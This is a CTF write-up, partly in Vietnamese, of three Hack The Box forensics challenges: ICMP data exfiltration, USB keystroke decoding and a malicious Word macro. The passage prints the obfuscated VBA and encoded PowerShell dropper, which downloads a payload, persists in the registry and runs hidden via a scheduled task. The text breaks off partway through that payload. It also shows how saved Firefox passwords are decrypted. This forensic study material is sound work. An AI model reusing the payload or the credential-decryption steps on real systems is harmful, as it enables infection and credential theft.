> # --- CHALLENGES OF FORENSICS ---

![image](https://user-images.githubusercontent.com/62060867/116218239-88e9ca00-a774-11eb-87ac-e86552bb625c.png)

# 1. Oldest trick in the book
[Forensics_Oldest_Trick.zip](https://github.com/Stirring16/CTF-Hack-The-Box-Cyber-Apocalypse-2021/files/6369734/forensics_oldest_trick.zip)

![image](https://user-images.githubusercontent.com/62060867/115961037-d7ae1e80-a53e-11eb-9d62-c489d5072d23.png)

* Challenge này cho mình một file ```PCAP```, đầu tiên hãy phân tích nps

![image](https://user-images.githubusercontent.com/62060867/115961250-d9c4ad00-a53f-11eb-998e-b1101dad7035.png)

* Vậy chúng ta có TCP, DNS, ICMP. Sau khi xem sơ lược thì ICMP là trọng tâm cần chú ý đến, Filter ```icmp``` trên wireshark để lọc những thứ không cần thiết 

![image](https://user-images.githubusercontent.com/62060867/115961355-4770d900-a540-11eb-82be-c6e246c3fb56.png)

* Tất cả các Protocol ICMP đều có length 100. Look at data, chúng ta có ```PK``` - file zip và chúng repeat 3 lần ```PK```
* Sử dụng ```tshark``` để lấy payloads, dùng filter để lấy các packet reply ```ip.dst == 192.168.1.8```

```tshark -r older_trick.pcap -Y "ip.dst == 192.168.1.8" -T fields -e data.data > raw```

* Vậy chúng ta đã có được payload, nhưng vấn đề ở đây là làm sao để lấy file zip vì playload ở đây có tận 3 PK, vì vậy mình đã viết một đoạn python để lấy bytes từ vị trí 16 đến 48

![image](https://user-images.githubusercontent.com/62060867/115962768-12b45000-a547-11eb-983e-8ecd011b0824.png)

```
#!usr/bin/env python3
flag = []

with open('raw', 'r') as file:
	text = file.readlines()

for payload in text:
	flag.append(bytearray.fromhex(payload[16:48]))

with open('flag.zip', 'wb') as out_file:
	out_file.write(b''.join(flag))
 ```
 ![image](https://user-images.githubusercontent.com/62060867/115963373-35476880-a549-11eb-90ef-ed738643e739.png)

 *So we have a zip file, unzip it
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/older]
└─$ unzip flag.zip 
Archive:  flag.zip
 extracting: fini/addons.json        
  inflating: fini/addonStartup.json.lz4  
  inflating: fini/broadcast-listeners.json  
  inflating: fini/cert9.db           
  inflating: fini/compatibility.ini  
  inflating: fini/containers.json    
  inflating: fini/content-prefs.sqlite  
  inflating: fini/cookies.sqlite     
  inflating: fini/cookies.sqlite-shm  
  inflating: fini/cookies.sqlite-wal  
  inflating: fini/extension-preferences.json  
  inflating: fini/extensions.json    
  inflating: fini/favicons.sqlite    
  inflating: fini/favicons.sqlite-shm  
  inflating: fini/favicons.sqlite-wal  
  inflating: fini/formhistory.sqlite  
  inflating: fini/handlers.json      
  inflating: fini/key4.db            
  inflating: fini/logins.json        
  inflating: fini/permissions.sqlite  
  inflating: fini/pkcs11.txt         
  inflating: fini/places.sqlite      
  inflating: fini/places.sqlite-shm  
  inflating: fini/places.sqlite-wal  
  inflating: fini/prefs.js           
  inflating: fini/protections.sqlite  
  inflating: fini/search.json.mozlz4  
  inflating: fini/sessionCheckpoints.json  
 extracting: fini/shield-preference-experiments.json  
  inflating: fini/SiteSecurityServiceState.txt  
  inflating: fini/storage.sqlite     
  inflating: fini/times.json         
  inflating: fini/webappsstore.sqlite  
  inflating: fini/webappsstore.sqlite-shm  
  inflating: fini/webappsstore.sqlite-wal  
  inflating: fini/xulstore.json  
 ```
* We have: json, sqlite, cookies, db
* Đến đây là lúc nhờ đồng đội chơi Web Duytayto.

```
┌──(kali㉿kali)-[~/Desktop/older]
└─$ cd fini      

┌──(kali㉿kali)-[~/Desktop/older/fini]
└─$ sudo apt-get install jq
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
jq is already the newest version (1.6-2.1).
0 upgraded, 0 newly installed, 0 to remove and 394 not upgraded.
                                                        
┌──(kali㉿kali)-[~/Desktop/older/fini]
└─$ jq -r -S '.logins[] | .hostname, .encryptedUsername, .encryptedPassword' logins.json | pwdecrypt -d . -p foobar
https://rabbitmq.makelarid.es
Decrypted: "Frank_B"
Decrypted: "CHTB{long_time_no_s33_icmp}"
 ```
> # So we have Flag: CHTB{long_time_no_s33_icmp}



# 2.Key mission	

[Forensics_Key_Mission.zip](https://github.com/Stirring16/CTF-Hack-The-Box-Cyber-Apocalypse-2021/files/6370199/forensics_key_mission.zip)

![image](https://user-images.githubusercontent.com/62060867/115967032-8a3faa80-a55a-11eb-9e93-bc91371bdad1.png)

* Chall này tiếp tục cho ta một file pcap nhưng thuộc loại Protocol USB, sau khi phân tích và research mình đã định hướng được hướng làm

![image](https://user-images.githubusercontent.com/62060867/115969171-db08d080-a565-11eb-8491-20c4b7a35439.png)

* Nhìn vào các packet có length 35 ta sẽ thấy `HID DATA` thay đổi, để thấy được rõ hơn mình add HID Data vào column

![image](https://user-images.githubusercontent.com/62060867/115969244-39ce4a00-a566-11eb-9e9a-471da96a57ba.png)

* Bây giờ chúng ta extract tất cả giá trị này bằng cách ```Export Packet Dessections - As CSV```

![image](https://user-images.githubusercontent.com/62060867/115969353-bc570980-a566-11eb-867c-1d2a0c539755.png)

![image](https://user-images.githubusercontent.com/62060867/115969377-d85aab00-a566-11eb-8ae3-00009be80d1f.png)
 
* Và dùng filter để lấy HID data vào một file

```
┌──(kali㉿kali)-[~/Desktop/key_mission]
└─$ cat hexoutput.txt      
0200000000000000
02000c0000000000
0200000000000000
0000000000000000
00002c0000000000
0000000000000000
0000040000000000
0000041000000000
0000100000000000
0000000000000000
00002c0000000000
0000160000000000
0000160800000000
0000080000000000
0000000000000000
0000110000000000
0000000000000000
.....
.....
```
* Đây là một loại mã hóa USB keyboard.
* Sau đó mình tìm thấy được một đoạn code thích hợp cho việc decode các giá trị này 

```
!/usr/bin/python

from __future__ import print_function
import sys,os


lcasekey = {}

ucasekey = {}

lcasekey[4]="a";           ucasekey[4]="A"
lcasekey[5]="b";           ucasekey[5]="B"
lcasekey[6]="c";           ucasekey[6]="C"
lcasekey[7]="d";           ucasekey[7]="D"
lcasekey[8]="e";           ucasekey[8]="E"
lcasekey[9]="f";           ucasekey[9]="F"
lcasekey[10]="g";          ucasekey[10]="G"
lcasekey[11]="h";          ucasekey[11]="H"
lcasekey[12]="i";          ucasekey[12]="I"
lcasekey[13]="j";          ucasekey[13]="J"
lcasekey[14]="k";          ucasekey[14]="K"
lcasekey[15]="l";          ucasekey[15]="L"
lcasekey[16]="m";          ucasekey[16]="M"
lcasekey[17]="n";          ucasekey[17]="N"
lcasekey[18]="o";          ucasekey[18]="O"
lcasekey[19]="p";          ucasekey[19]="P"
lcasekey[20]="q";          ucasekey[20]="Q"
lcasekey[21]="r";          ucasekey[21]="R"
lcasekey[22]="s";          ucasekey[22]="S"
lcasekey[23]="t";          ucasekey[23]="T"
lcasekey[24]="u";          ucasekey[24]="U"
lcasekey[25]="v";          ucasekey[25]="V"
lcasekey[26]="w";          ucasekey[26]="W"
lcasekey[27]="x";          ucasekey[27]="X"
lcasekey[28]="y";          ucasekey[28]="Y"
lcasekey[29]="z";          ucasekey[29]="Z"
lcasekey[30]="1";          ucasekey[30]="!"
lcasekey[31]="2";          ucasekey[31]="@"
lcasekey[32]="3";          ucasekey[32]="#"
lcasekey[33]="4";          ucasekey[33]="$"
lcasekey[34]="5";          ucasekey[34]="%"
lcasekey[35]="6";          ucasekey[35]="^"
lcasekey[36]="7";          ucasekey[36]="&"
lcasekey[37]="8";          ucasekey[37]="*"
lcasekey[38]="9";          ucasekey[38]="("
lcasekey[39]="0";          ucasekey[39]=")"
lcasekey[40]="Enter";      ucasekey[40]="Enter"
lcasekey[41]="esc";        ucasekey[41]="esc"
lcasekey[42]="del";        ucasekey[42]="del"
lcasekey[43]="tab";        ucasekey[43]="tab"
lcasekey[44]="space";      ucasekey[44]="space"
lcasekey[45]="-";          ucasekey[45]="_"
lcasekey[46]="=";          ucasekey[46]="+"
lcasekey[47]="[";          ucasekey[47]="{"
lcasekey[48]="]";          ucasekey[48]="}"
lcasekey[49]="\\";         ucasekey[49]="|"
lcasekey[50]=" ";          ucasekey[50]=" "
lcasekey[51]=";";          ucasekey[51]=":"
lcasekey[52]="'";          ucasekey[52]="\""
lcasekey[53]="`";          ucasekey[53]="~"
lcasekey[54]=",";          ucasekey[54]="<"
lcasekey[55]=".";          ucasekey[55]=">"
lcasekey[56]="/";          ucasekey[56]="?"
lcasekey[57]="CapsLock";   ucasekey[57]="CapsLock"
lcasekey[79]="RightArrow"; ucasekey[79]="RightArrow"
lcasekey[80]="LeftArrow";  ucasekey[80]="LeftArrow"
lcasekey[84]="/";          ucasekey[84]="/"
lcasekey[85]="*";          ucasekey[85]="*"
lcasekey[86]="-";          ucasekey[86]="-"
lcasekey[87]="+";          ucasekey[87]="+"
lcasekey[88]="Enter";      ucasekey[88]="Enter"
lcasekey[89]="1";          ucasekey[89]="1"
lcasekey[90]="2";          ucasekey[90]="2"
lcasekey[91]="3";          ucasekey[91]="3"
lcasekey[92]="4";          ucasekey[92]="4"
lcasekey[93]="5";          ucasekey[93]="5"
lcasekey[94]="6";          ucasekey[94]="6"
lcasekey[95]="7";          ucasekey[95]="7"
lcasekey[96]="8";          ucasekey[96]="8"
lcasekey[97]="9";          ucasekey[97]="9"
lcasekey[98]="0";          ucasekey[98]="0"
lcasekey[99]=".";          ucasekey[99]="."

if len(sys.argv) == 2:
	keycodes = open(sys.argv[1])
	for line in keycodes:
		bytesArray = bytearray.fromhex(line.strip())
		val = int(bytesArray[2])
		if val > 3 and val < 100:
		        if bytesArray[0] == 0x02 or bytesArray[0] == 0x20 :
				print(ucasekey[int(bytesArray[2])], end=''),  #single line output
			    
			else:
				print(lcasekey[int(bytesArray[2])], end=''),  #single line output	
else:
    print("USAGE: python %s [filename]" % os.path.basename(__file__))
    
```
```
──(kali㉿kali)-[~/Desktop/key_mission]
└─$ python script.py hexoutput.txt | grep CHTB    130 ⨯
Ispaceaamspacessendinfdeldelgspacessecrretary'sspaceloccationspaceoveerspacethisspacetottallyspaceencryptedspacechannelspacetospacemakespacesurrespacenospaceonespaceelssespacewillspacebespaceablespacetospacespacerreeatdeldeldspaceittspaceexcepptspaceofspaceus.spaceTthisspaceinformmaationspaceissspaceconfiddentialspaceandspacemustspacenotspacebespacesharredspacewithspaceanyonespaceelsse.spaceTthespacespacessecrretary'sspacehiddenspacelooccationspaceisspaceCHTB{a_place=3deldel-3deldel_3deldeldel3_fAr_fAar_awway_ffr0m_eearth}Enter

```
Oh you here `CHTB{a_place=3deldel-3deldel_3deldeldel3_fAr_fAar_awway_ffr0m_eearth}`. Tưởng mọi việc đã xong copy và submit 🥇 
> * Wrong flag tèn ten 
* Fake flag, oh no. Sau đó Duytayto đã nhìn ra được quy luật của strings này
```
I aam -> I am
ssendinfdeldelg -> sending
deldel = backspace
```
* Đây mới chính là cái ta cần tìm `CHTB{a_plac3_fAr_fAr_away_fr0m_earth}`
> # So we got the flag: CHTB{a_plac3_fAr_fAr_away_fr0m_earth}

# 3.Invitation

[forensics_invitation.zip](https://github.com/Stirring16/CTF-Hack-The-Box-Cyber-Apocalypse-2021/files/6370730/forensics_invitation.zip)


![image](https://user-images.githubusercontent.com/62060867/115973389-d56bb480-a57e-11eb-80b4-12ccaa3cb803.png)

* Challenge này cho ta một file docx. Đây là một challenge phân tích tài liệu độc hại
* Thật chất đây là một file zip nên mình unzip và mục tiêu là tìm kiếm macro

```
┌──(kali㉿kali)-[~/Desktop/Invitation]
└─$ unzip invite.docm             
Archive:  invite.docm
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: word/document.xml       
  inflating: word/_rels/document.xml.rels  
  inflating: word/vbaProject.bin     
 extracting: word/media/image1.png   
  inflating: word/theme/theme1.xml   
  inflating: word/_rels/vbaProject.bin.rels  
  inflating: word/vbaData.xml        
  inflating: word/settings.xml       
  inflating: word/styles.xml         
  inflating: word/webSettings.xml    
  inflating: word/fontTable.xml      
  inflating: docProps/core.xml       
  inflating: docProps/app.xml        
                                                                                                          
┌──(kali㉿kali)-[~/Desktop/Invitation]
└─$ tree
.
├── [Content_Types].xml
├── docProps
│   ├── app.xml
│   └── core.xml
├── invite.docm
├── _rels
└── word
    ├── document.xml
    ├── fontTable.xml
    ├── media
    │   └── image1.png
    ├── _rels
    │   ├── document.xml.rels
    │   └── vbaProject.bin.rels
    ├── settings.xml
    ├── styles.xml
    ├── theme
    │   └── theme1.xml
    ├── vbaData.xml
    ├── vbaProject.bin
    └── webSettings.xml

6 directories, 15 files

```
* Sau khi check tất cả các file thì mình nhận thấy file `vbaProject.bin` là nghi ngờ nhất
* Mình dùng [olevba](https://github.com/decalage2/oletools) để phân tích 

```
┌──(kali㉿kali)-[~/Desktop/Invitation/word]
└─$ olevba vbaProject.bin | more              147 ⨯ 1 ⚙
olevba 0.56.1 on Python 3.9.2 - http://decalage.info/pyt
hon/oletools
========================================================
=======================
FILE: vbaProject.bin
Type: OLE
--------------------------------------------------------
-----------------------
VBA MACRO ThisDocument.cls 
in file: vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - 
- - - - - - - - - - - 
Dim bomazpcuwhstlcd As String
Dim dbcsmjrdsqm As String
Dim gxiwcxqzqi As String
Dim uejdkidq As String
bomazpcuwhstlcd = odsuozldxufm("4c674167414367414941416b
414641416377426f4147384162514246414673414e41426441437341
4a41427741484d4161414276414530415a51426241444d414d414264
414373414a774234414363414b514167414367414941426241484d41
6441427941476b4162674248414630414f67413641476f4162774270
4147") & odsuozldxufm("34414b41416e") & _
odsuozldxufm("4143634149414173414341414b4142624146494152
") & odsuozldxufm("514248414755415741426441446f414f67424
e41474541564142444145674152514254414367414941416941436b4
14a774234414363414b77426441444d414d514262414551415351427
3414577415a51424941484d414a414172414630414d5142624145514
16151424d41457741") & _
odsuozldxufm("5a51426f41484d414a414167414367414a67423841
4341414b51413041444d4158514253414545416141426a4146734158
51424841473441535142534146514163774262414377414a77423041
4667416167416e414367415a51424441454541544142514145554155
67417541436b414a77416b414363414c41416e41486341") & odsuo
zldxufm("63514270") & _
odsuozldxufm("414363414b41426c41454d415151424d4146414152
514253414334414b51416e4144734164414259414363414b77416e41
476f415a514279414745415877427a41474d416277426b4147774159
514274414363414b77416e") & odsuozldxufm("414873415167416
e414373414a774255414363414b77416e41456741517742304146674
16167416741436341") & _
odsuozldxufm("4b77416e4144304149414277414363414b77416e41
4763415a5142794148634163514270414363414b414169414341414c
41416e414334414a774167414377414a774253414363414b77416e41
476b41527742494146514164414250414777414a774172414363415a
51426d414851414a77416741436b414941423841434141526742") &
 odsuozldxufm("76") & _
odsuozldxufm("414649415251426841454d41534141744145384151
67424b4147554159774255414341416577416b414638414c67425741
45454154414256414555416651416741436b414b514167414341414b
51414b41416f414367416b4148414159514235414777416277426841

...

```

*Hmmm mình sẽ cố gắng giải mã các biểu thức VBA bằng deobfuscate và hiển thị mã nguồn macro sau khi thay thế tất cả các chuỗi bị xáo trộn bằng nội dung được giải mã của chúng

```
olevba --decode --deobf --reveal vbaProject.bin
```
```
┌──(kali㉿kali)-[~/Desktop/Invitation/word]
└─$ olevba --decode --deobf --reveal vbaProject.bin
......
Dim bomazpcuwhstlcd As String
Dim dbcsmjrdsqm As String
Dim gxiwcxqzqi As String
Dim uejdkidq As String
bomazpcuwhstlcd = "b'LgAgACgAIAAkAFAAcwBoAG8AbQBFAFsANABdACsAJABwAHMAaABvAE0AZQBbADMAMABdACsAJwB4ACcAKQAgACgAIABbAHMAd
AByAGkAbgBHAF0AOgA6AGoAbwBpAG'b'4AKAAn'b'ACcAIAAsACAAKABbAFIAR'b'QBHAGUAWABdADoAOgBNAGEAVABDAEgARQBTACgAIAAiACkAJwB4AC
cAKwBdADMAMQBbAEQASQBsAEwAZQBIAHMAJAArAF0AMQBbAEQAaQBMAEwA'b'ZQBoAHMAJAAgACgAJgB8ACAAKQA0ADMAXQBSAEEAaABjAFsAXQBHAG4AS
QBSAFQAcwBbACwAJwB0AFgAagAnACgAZQBDAEEATABQAEUAUgAuACkAJwAkACcALAAnAHcA'b'cQBp'b'ACcAKABlAEMAQQBMAFAARQBSAC4AKQAnADsAd
ABYACcAKwAnAGoAZQByAGEAXwBzAGMAbwBkAGwAYQBtACcAKwAn'b'AHsAQgAnACsAJwBUACcAKwAnAEgAQwB0AFgAagAgACcA'b'KwAnAD0AIABwACcAK
wAnAGcAZQByAHcAcQBpACcAKAAiACAALAAnAC4AJwAgACwAJwBSACcAKwAnAGkARwBIAFQAdABPAGwAJwArACcAZQBmAHQAJwAgACkAIAB8ACAARgB'" &
 odsuozldxufm("76b'AFIARQBhAEMASAAtAE8AQgBKAGUAYwBUACAAewAkAF8ALgBWAEEATABVAEUAfQAgACkAKQAgACAAKQAKAAoACgAkAHAAYQB5AGw
AbwBhAGQAQgBhAHM'b'AZQA2ADQAIAA9ACAA'b'IgBKAEEAQgBqAEEARwB3AEEAYQBRAEIAbABBAEcANABBAGQAQQBBAGcAQQBEADAAQQBJAEEAQgBPAEE
ARwBV'b'AEEAZAB3AEEAdABBAEUAOABBAFkAZwBCAHEAQQBHAFUAQQBZ'b'AHcAQgAwAEEAQwBBAEEAVQB3AEIANQBBAEgATQBBAGQAQQBCAGwAQQBHADA
AQQBMAGcAQgBPAEEARwBVAEEAZABBAEEAdQBBAEYATQBBAGIA'b'dwBCAGoAQQBHAHMAQQBaAFEA'b'QgAwAEEASABNAEEATABnAEIAVQBBAEUATQBBAFU
AQQBCAEQAQQBHAHcAQQBhAFEAQgBsAEEARwA0AEEAZABBAEEAbwBBAEMASQBBAE0AUQBBADUAQQBEAFkAQQ'b'BMAGcAQQB5'b'AEEARABNAEEATQB3AEE
AegBBAEMANABBAE4AUQBBADAAQQBDADQAQQBNAGcAQQBpAEEAQwB3AEEATgBBA'b'EEAMABBAEQAUQBBAE4AQQBBAHAAQQBEAHMAQQBKAEEAQgB6AEEA'b
'SABRAEEAYwBnAEIAbABBAEcARQBBAGIAUQBBA'b'GcAQQBEADAAQQBJAEEAQQBrAEEARwBNAEEAYgBBAEIAcABBAEcAVQBBAGIAZwBCADAAQQBDADQAQQ
BSAHcAQgBsAEEASABR'b'AEEAVQB3AEIAMABBAEgASQBBAFoAUQBCAGgAQQBHADAAQQBLAEEAQQBwAEEARABzAEEAVwB3AEIAaQBBAEgAawBBAGQAQQBCA
GwAQQBGAHMAQQB'b'YAFEAQgBkAEEAQwBRAEEA'b'WQBnAEIANQBBAEgAUQBBAFoAUQBCAHoAQQBDAEEAQQBQAFEAQQBnAEEARABBAEEATABnAEEAdQBBA
EQAWQBBAE4AUQBBADEA'b'QQBEAE0AQQBOAFEAQgA4AEEAQwBVAEEAZQB3'b'AE'b'EAdwBBAEgAMABBAE8AdwBCADMAQQBHAGcAQQBhAFEAQgBzAEEARw
BVAEEASwBBAEEAbwBBAEMAUQBBAGEAUQBBAGcAQQBEADAAQQBJAEEAQQBrAEEASABNAEEAZABBAEIA'b'eQBBAEcAVQBB'b'AFkAUQBCAHQAQQBDADQAQQ
BVAGcAQgBsAEEARwBFAEEAWgBBAEEAbwBBAEMAUQBBAFkAZwBCADUAQQBIAFEAQQBaAFEAQgB6AEEAQwB3AEEASQBBAEEAdwBB'b'AEMAdwBBAEkAQQBBA
GsAQQBHAEkAQQBlAFEAQgAwAEEARwBVAEEAYwB3AEEAdQBBAEUAdwBBAFoAUQ'b'BCAHUAQQBHAGMAQQBkAEEAQgBvAEEAQwBrAEEASwBRAEEAZwBBAEMA
'b'MABBAGIAZwBCAGwAQQBDAEEAQQBNAEEAQQBwAEEASABz'b'AEEATwB3AEEAawBBAEcAUQBBAFkAUQBCADAAQQBHAEUAQQBJAEEAQQA5AEEAQwBBAEEA
SwBBAEIATwBBAEcAVQBB'b'AGQAdwBBAHQAQQBFADgAQQBZAGcAQgBxAEEARwBVAEEAWQB3AEIAMABBAEMAQQBBAEwA'b'UQBCAFUAQQBIAGsAQQBjAEEA
QgBsAEEARQA0AEEAWQBRAEIAdABBAEcAVQBBAEkA'b'QQBCAFQAQQBIAGsAQQBjAHcAQgAwAEEARwBVAEEAYgBRAEEAdQBBAEYAUQBBAFoAUQBCADQAQQB
IAFEAQQBMAGcAQgBCAEEARgBNAEEAUQB3AE'b'IASgBBAEUAawBBAFIAUQBC'b'AHUAQQBHAE0AQQBiAHcAQgBrAEEARwBrAEEAYgBnAEIAbgBBAEMAawB
BAEwA'b'ZwBCAEgAQQBHAFUAQQBkAEEAQgBUAEEASABRAEEAYwBnAEIAcABBAEcANABBAFoAdwBBAG8A'b'QQBDAFEAQQBZAGcAQgA1AEEASABRAEEAW'b
'gBRAEIAegBBAEMAdwBBAE0AQQBBAHMAQQBDAEEAQQBKAEEAQgBwAEEAQwBrAEEATwB3AEEAawBBAEgATQBBAFoAUQBCAHUAQQBH'b'AFEAQQBZAGcAQgB
oAEEARwBNAEEAYQB3AEEAZwBBAEQAMABBAEkAQQBBAG8AQQBHAGsAQQBaAFEAQ'b'gA0AEEAQwBBAEEASgBBAEIAawBBAEcARQBBAGQAQQBCAGgAQQBDAE
EA'")
dbcsmjrdsqm = "b'QQBNAGcAQQArAEEAQwBZAEEATQBRAEEAZwBBAEgAdwB'b'BAEkAQQBCAFAAQQBIAFUAQQBkAEEAQQB0AEEARgBNAEEAZABBAEIAeQ
BBAEcAawBBAGIAZwBCAG4AQQBDAEEAQQBL'b'AFEAQQA3AEEAQwBRAEEAYwB3AEIAbABBAEcANABBAFoAQQBCAGkAQQBHAEUAQQBZAHcAQgByAEEARABJ'
b'AEEASQBBAEEAZwBBAEQAMABBAEkAQQBBAGsAQQBIAE0AQQBaAFEA'b'QgB1AEEARwBRAEEAWQBnAEIAaABBAEcATQBBAGEAdwBBAGcAQQBDAHMAQQBJA
EEAQQBpAEEARgBBAEEAVQB3AEEAZwBBAEMASQBBAEkAQQB'b'BAHIAQQBDAEEAQQBLAEEAQgB3'b'AEEASABjAEEAWgBBAEEAcABBAEMANABBAFUAQQBCA
GgAQQBIAFEAQQBhAEEAQQBnAEEAQwBzAEEASQBBAEEAa'b'QBBAEQANABBAEkAQQBBAGkAQQBEAHMAQQBKAEEAQgB6AEEA'b'RwBVAEEAYgBnAEIAawBBA

...skipping 1 line
gxiwcxqzqi = "b'VAB5AHAAZQAgAC0ATgBhAG0AZQAgAFcAaQBuAG'b'QAbwB3ACAALQBOAGEAbQBlAHMAcABhAGMAZQAgAEMAbwBuAHMAbwBsAGUAIAA
tAE0AZQBtAGIAZQByAEQAZQBmAGkAbgBp'b'AHQAaQBvAG4AIAAnAAoAWwBEAGwAbABJAG0AcABvAHIAdAAoACIASwBlAHIAbgBlAGwAMwAyAC4AZABsAG
wAIgApAF0'b'ACgBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAA'b'ZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AEMAbwBuAHMAbwBsAG
UAVwBpAG4AZABvAHcAKAApADsACgAKAFsA'b'RABsAGwASQBtAHAAbwByAHQAKAAiAHUAcwBl'b'AHIAMwAyAC4AZABsAGwAIgApAF0ACgBwAHUAYgBsAG
kAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBs'b'ACAAUwBoAG8AdwBXAGkAbgBkAG8AdwAoAEkA'b'bgB0AFAAdAByACAAaABXAG
4AZAAsACAASQBuAHQAMwAyACAAbgBDAG0AZABTAGgAbwB3ACkAOwAKACcAOwAKAFsAQwBvAG4AcwBvAGwA'b'ZQAuAFcAaQBuAGQAbwB3AF0AOgA6'b'AF
MAaABvAHcAVwBpAG4AZABvAHcAKABbAEMAbwBuAHMAbwBsAGUALgBXAGkAbgBkAG8AdwBdADoAOgBHAG'b'UAdABDAG8AbgBzAG8AbABlAFcAaQBuAGQAb
wB3ACgAKQAsACAA'b'MAApADsACgAKAAoAaQBmACAAKAAkAHAAYQB5AGwAbwBhAGQAQgBhAHMAZQA2ADQAIAAtAG0AYQB0AGMAaAAgACIA'b'aAB0AHQAc
AA6AHwAaAB0AHQAcABzADoAIgApACAAewAK'b'ACAAIAAgACAAJABwAGEAeQBsAG8AYQBkAEIAYQBzAGUANgA0ACAAPQAgACgATgBlAHcALQBPAGIA'b'a
gBlAGMAdAAgACIATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAAiACkA'b'LgBEAG8AdwBuAGwAbwBhAGQAUwB'b'0AHIAaQBuAGcAKAAkAHAAYQB5AGwAb
wBhAGQAQgBhAHMAZQA2ADQAKQA7AAoAfQAKAAoAJABpAG4AcwB0AGEAbABsAGUAZAAgAD0AIABH'b'AGUAdAAtAEkAdA'b'BlAG0AUAByAG8AcABlAHIAd
AB5ACAALQBQAGEAdABoACAAIgBIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXAAkACgAJAByAGUAZwBwACkAIgAgAC0A'b'TgBhAG0AZ'b'QAgACIAJ
AAoACQAcgBlAGcAbgApACIAIAAtAGUAYQAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAOwAKAAoACgBpAGYAIAAoACQAaQBuAHMAdABh'b'
AGwAbABlAGQA'b'KQAgAHsACgAKAAoAIAAgACAAIABpAGYAIAAoACQAaQBuAHMAdABhAGwAbABlAGQAIAAtAG4AZQAgACQAcABhAHkAbABvAGEAZABCAGE
AcwBlADYANAApACAA'b'ewAKACAAIAAgACAAIAAgACAAIABTAGUAdAAtAEkAdA'b'BlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEs
AQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXAAk'b'ACgAJAByAGUAZwBwACkAIgAgAC0ATgBhAG'b'0AZQAgACIAJAAoACQAcgBlAGcAbgApACIAIAAtAEY
AbwByAGMAZQAgAC0AVgBhAGwAdQBlACAAJABwAGEAeQBsAG8AYQBkAEIA'b'YQBzAGUANgA0ADsACgAgACAAIAAgAH0ACgAKACMAIABpAG4AcwB0AGEAbA
BsAGEAdABpAG8AbgAKAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAACgAKACAAIAAgACA'b'AaQBm'b'ACAAKAAkAEYAQQBMAFMARQAgAC0AZQBxACAAKA
BUAGUAcwB0AC0AUABhAHQAaA'b'AgAC0AUABhAHQAaAAgACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwAJAAoACQA'b'cgBlAGcAcAApAFwAIg
ApACkAIAB7AAoAIAAgACAAIAAgACAAIAAgAE4AZQ'b'B3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBl'
b'AFwAJAAoACQAcgBlAGcAcAApACIAOwAKACAAIAAgACAAfQAKACAAIAAgACAAUw'b'BlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhA
HQAaAAgACIASABLAEMA'b'VQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwAJAAoACQA'b'cgBlAGcAcAApACIAIAAtAE4AYQBtAGUAIAAiACQAKAAkAHIAZQBnA
G4AKQAiACAALQBGAG8AcgBjAGUAIAAtAFYAYQBs'b'AHUAZQAgACQAcABhAHkAbABvAGEAZABCAGEAcwBlADYANAA7AAoAIAAg'b'ACAAIAAKACAAIAAgA
CAACgAgACAAIAAgACQAdQAgAD0AIABbAEUAbgB2AGkAcgBvAG4AbQBlAG4A'"
uejdkidq = "b'dABdADoAOgBVAHMAZQByAE4AYQBtAGUAOwAKACAAIAAgACAACgAgACAAIAAgAAoAIAAgACAAIAAkAHQAYQBzAGsAIAA9ACAARwBlAHQA
LQBTAGMAaABlAGQAdQBsAGUAZ'b'ABU'b'AGEAcwBrACAALQBUAGEAcwBrAE4AYQBtAGUAIAAiACQAKAAkAHIAZQBnAHAAKQAkACg'b'AJAByAGUAZwBuA
CkAIgAgAC0AZQBhACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQA'b'aQBuAHUAZQA7AAoAIAAgACAAIABpAGYAIAAoACQAdABhAHMAawApACAAewAKACAA
IAA'b'gACAAIAAgACAAIABVAG4AcgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABl'b'AGQAVABhAHMAawAgAC0AVABhAHMAawBOAGE'b'AbQBlA
CAAIgAkACgAJAByAGUAZwBwACkAJAAoACQAcgBlAGcAbgApACIAIAAtAEMAbwBuAGYAaQByAG0AOgAkAGYAYQBsAHMA'b'ZQA7AAoAIAAgACAAIAB9AAoA
IAAgACAAIAAKACAAIAAgACAACgAgACAAIAAgACQAYQAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQ'b'AYQBzAGsAQQBjAHQAaQBv'b'AG4A
IAAtAEUAeABlAGMAdQB0AGUAIAAiAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAiACAAIgAtAHcAIABoAGkAZABkAGU'b'AbgAgAC0ARQB4AGUAYwB
1AHQAaQBvAG4A'b'UABvAGw'b'AaQBjAHkAIABCAHkAcABhAHMAcwAgAC0AbgBvAHAAIAAtAE4AbwBFAHgAaQB0ACAALQBDACAAVwByAGkAdABlAC0AaAB
vAHMAdAAgACcAVwBpAG4AZABvAHcAcwAg'b'AHUAcA'b'BkAGEAdABlACAAcgBlAGEAZAB5ACcAOwAgAGkAZQB4ACAAKABbAFMAeQBzAHQAZQBtAC4AVAB
lAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4A'b'RwBlAHQ'b'AUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgB
